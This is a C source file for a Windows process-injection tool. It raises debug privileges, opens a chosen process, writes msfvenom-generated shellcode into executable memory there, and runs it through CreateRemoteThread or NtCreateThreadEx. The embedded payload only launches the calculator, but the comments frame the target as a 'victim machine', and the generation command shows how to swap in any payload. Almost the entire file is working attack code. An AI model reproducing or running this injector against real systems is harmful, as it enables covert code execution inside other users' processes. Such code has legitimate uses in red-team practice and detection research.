#include<stdio.h>
#include<Windows.h>

#pragma comment (linker, "/defaultlib:ntdll.lib")





#ifdef _X86_
typedef NTSTATUS(NTAPI* pfnNtCreateThreadEx)
(
OUT PHANDLE hThread,
IN ACCESS_MASK DesiredAccess,
IN PVOID ObjectAttributes,
IN HANDLE ProcessHandle,
IN PVOID lpStartAddress,
IN PVOID lpParameter,
IN ULONG Flags,
IN SIZE_T StackZeroBits,
IN SIZE_T SizeOfStackCommit,
IN SIZE_T SizeOfStackReserve,
OUT PVOID lpBytesBuffer);

//msfvenom --platform windows -p windows/exec CMD="calc.exe" -b "\x00\xff" EXITFUNC=thread -f c
//pops calculator on victim machine
unsigned char sc[] = "\xdb\xd9\xbe\x95\x2c\x95\x21\xd9\x74\x24\xf4\x5f\x29\xc9\xb1"
"\x31\x31\x77\x18\x83\xef\xfc\x03\x77\x81\xce\x60\xdd\x41\x8c"
"\x8b\x1e\x91\xf1\x02\xfb\xa0\x31\x70\x8f\x92\x81\xf2\xdd\x1e"
"\x69\x56\xf6\x95\x1f\x7f\xf9\x1e\x95\x59\x34\x9f\x86\x9a\x57"
"\x23\xd5\xce\xb7\x1a\x16\x03\xb9\x5b\x4b\xee\xeb\x34\x07\x5d"
"\x1c\x31\x5d\x5e\x97\x09\x73\xe6\x44\xd9\x72\xc7\xda\x52\x2d"
"\xc7\xdd\xb7\x45\x4e\xc6\xd4\x60\x18\x7d\x2e\x1e\x9b\x57\x7f"
"\xdf\x30\x96\xb0\x12\x48\xde\x76\xcd\x3f\x16\x85\x70\x38\xed"
"\xf4\xae\xcd\xf6\x5e\x24\x75\xd3\x5f\xe9\xe0\x90\x53\x46\x66"
"\xfe\x77\x59\xab\x74\x83\xd2\x4a\x5b\x02\xa0\x68\x7f\x4f\x72"
"\x10\x26\x35\xd5\x2d\x38\x96\x8a\x8b\x32\x3a\xde\xa1\x18\x50"
"\x21\x37\x27\x16\x21\x47\x28\x06\x4a\x76\xa3\xc9\x0d\x87\x66"
"\xae\xf2\x65\xa3\xda\x9a\x33\x26\x67\xc7\xc3\x9c\xab\xfe\x47"
"\x15\x53\x05\x57\x5c\x56\x41\xdf\x8c\x2a\xda\x8a\xb2\x99\xdb"
"\x9e\xd0\x7c\x48\x42\x39\x1b\xe8\xe1\x45";

#endif
//this i kept only for 32-bit,x64 could just be added from here.
typedef struct _CLIENT_ID {
	HANDLE UniqueProcess;
	HANDLE UniqueThread;
} CLIENT_ID, *PCLIENT_ID;
typedef NTSTATUS(NTAPI * pfnRtlCreateUserThread)(
	IN HANDLE ProcessHandle,
	IN PSECURITY_DESCRIPTOR SecurityDescriptor OPTIONAL,
	IN BOOLEAN CreateSuspended,
	IN ULONG StackZeroBits OPTIONAL,
	IN SIZE_T StackReserve OPTIONAL,
	IN SIZE_T StackCommit OPTIONAL,
	IN PTHREAD_START_ROUTINE StartAddress,
	IN PVOID Parameter OPTIONAL,
	OUT PHANDLE ThreadHandle OPTIONAL,
	OUT PCLIENT_ID ClientId OPTIONAL);



BOOL EnableDebugPrivilege(BOOL fEnable)
{
	BOOL fOk = FALSE;
	HANDLE hToken;
	if (OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES, &hToken))
	{
		TOKEN_PRIVILEGES tp;
		tp.PrivilegeCount = 1;
		LookupPrivilegeValue(NULL, SE_DEBUG_NAME, &tp.Privileges[0].Luid);
		tp.Privileges[0].Attributes = fEnable ? SE_PRIVILEGE_ENABLED : 0;
		AdjustTokenPrivileges(hToken, FALSE, &tp, sizeof(tp), NULL, NULL);
		fOk = (GetLastError() == ERROR_SUCCESS);
		CloseHandle(hToken);
	}
	return(fOk);
}
int wmain(int argc, wchar_t **argv)
{
	if (!EnableDebugPrivilege(TRUE))
	{
		printf("[!]AdjustTokenPrivileges Failed.<%d>\n", GetLastError());
	}
	if (argc != 3)
	{
		printf("Usage:Th_inj.exe [PID] [option number]\noption 1 - CreateRemoteThread\noption 2 - NtCreateThreadEx\n");
		return -1;
	}
	int option = _wtoi(argv[2]);
	if (option != 1 && option != 2 && option != 3)
	{
		printf("[-] Wrong option number\n");
		ExitProcess(-1);
	}
	DWORD pid = _wtoi(argv[1]);
	printf("PID is: %d,0x%x\n", (UINT)pid, (UINT)pid);
	HANDLE hprocess = OpenProcess(PROCESS_ALL_ACCESS,FALSE,pid);
	
	printf("Process handle: 0x%x\n", (UINT)hprocess);
	
	LPVOID lpbaseaddress = (LPVOID)VirtualAllocEx(hprocess, NULL, 0x1000, MEM_RESERVE | MEM_COMMIT, PAGE_EXECUTE_READWRITE);
	
	
	printf("Allocated memory address in target process is: 0x%Ix\n", (SIZE_T)lpbaseaddress);

	SIZE_T *lpbyteswritten = 0;
	BOOL wr = WriteProcessMemory(hprocess,lpbaseaddress,(LPVOID)sc,sizeof(sc),lpbyteswritten);
	
	
	printf("Shellcode is written to memory of target PID\n");
	//start remote thread in target process
	HANDLE hthread = NULL;
	DWORD threadid = 0;

	switch (option)
	{
	case 1:
	{
			  hthread = CreateRemoteThread(hprocess, NULL, 0, (LPTHREAD_START_ROUTINE)lpbaseaddress, NULL, 0, (LPDWORD)(&threadid));
			  break;
	}
	case 2:
	{
			 
			  LPTHREAD_START_ROUTINE FreeLibraryAddress = NULL;
			  HMODULE Kernel32Module = GetModuleHandle("Kernel32");
			  FreeLibraryAddress = (LPTHREAD_START_ROUTINE)GetProcAddress(Kernel32Module, "FreeLibrary");
			  pfnNtCreateThreadEx NtCreateThreadEx = (pfnNtCreateThreadEx)GetProcAddress(GetModuleHandle("ntdll.dll"), "NtCreateThreadEx");
			  if (NtCreateThreadEx == NULL)
			  {
				  CloseHandle(hprocess);
				  printf("[!]NtCreateThreadEx error\n");
				  return FALSE;
			  }
			  HANDLE ThreadHandle = NULL;

			  NtCreateThreadEx(&ThreadHandle, GENERIC_ALL, NULL, hprocess, (LPTHREAD_START_ROUTINE)lpbaseaddress, NULL, NULL, NULL, NULL, NULL, NULL);
			  if (ThreadHandle == NULL)
			  {
				  CloseHandle(hprocess);
				  printf("[!]ThreadHandle error\n");
				  return FALSE;
			  }
			  
			  break;


	}
	

	
}
printf("Successfully injected shellcode in the target PID\n");
return 0;
}
